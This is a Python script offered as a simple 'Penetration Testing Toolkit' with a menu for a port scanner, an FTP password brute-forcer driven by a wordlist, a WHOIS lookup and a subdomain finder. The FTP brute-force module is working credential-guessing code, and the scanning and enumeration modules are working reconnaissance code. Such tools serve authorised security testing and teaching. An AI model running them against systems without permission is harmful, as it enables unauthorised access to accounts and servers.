import socket
import ftplib
import requests
import sys
import whois

# ---------------------------
# MODULE 1: Port Scanner
# ---------------------------
def port_scanner(target, ports=[21, 22, 80, 443, 8080]):
    print(f"\n[+] Scanning ports on {target}")
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"[OPEN] Port {port}")
            sock.close()
        except Exception as e:
            print(f"Error scanning port {port}: {e}")

# ---------------------------
# MODULE 2: FTP Brute Force
# ---------------------------
def ftp_brute_force(target, user, wordlist):
    print(f"\n[+] Starting FTP brute force on {target} with user {user}")
    try:
        with open(wordlist, 'r') as f:
            for password in f:
                password = password.strip()
                try:
                    ftp = ftplib.FTP(target)
                    ftp.login(user, password)
                    print(f"[SUCCESS] Username: {user} | Password: {password}")
                    ftp.quit()
                    return
                except ftplib.error_perm:
                    print(f"[FAILED] {password}")
        print("[-] Brute force failed. No valid password found.")
    except FileNotFoundError:
        print("Wordlist file not found!")

# ---------------------------
# MODULE 3: WHOIS Lookup
# ---------------------------
def whois_lookup(domain):
    print(f"\n[+] Performing WHOIS lookup for {domain}")
    try:
        w = whois.whois(domain)
        print(w)
    except Exception as e:
        print(f"Error: {e}")

# ---------------------------
# MODULE 4: Subdomain Finder
# ---------------------------
def subdomain_finder(domain, wordlist):
    print(f"\n[+] Finding subdomains for {domain}")
    try:
        with open(wordlist, 'r') as f:
            for sub in f:
                sub = sub.strip()
                url = f"http://{sub}.{domain}"
                try:
                    requests.get(url, timeout=2)
                    print(f"[FOUND] {url}")
                except requests.ConnectionError:
                    pass
    except FileNotFoundError:
        print("Wordlist file not found!")

# ---------------------------
# MAIN MENU
# ---------------------------
def menu():
    while True:
        print("\n=== Penetration Testing Toolkit ===")
        print("1. Port Scanner")
        print("2. FTP Brute Force")
        print("3. WHOIS Lookup")
        print("4. Subdomain Finder")
        print("5. Exit")
        choice = input("Select an option: ")

        if choice == "1":
            target = input("Enter target IP/Domain: ")
            port_scanner(target)
        elif choice == "2":
            target = input("Enter FTP server: ")
            user = input("Enter username: ")
            wordlist = input("Enter path to password wordlist: ")
            ftp_brute_force(target, user, wordlist)
        elif choice == "3":
            domain = input("Enter domain: ")
            whois_lookup(domain)
        elif choice == "4":
            domain = input("Enter domain: ")
            wordlist = input("Enter subdomain wordlist file: ")
            subdomain_finder(domain, wordlist)
        elif choice == "5":
            print("Exiting... Stay ethical!")
            sys.exit()
        else:
            print("Invalid choice! Try again.")

if __name__ == "__main__":
    menu()
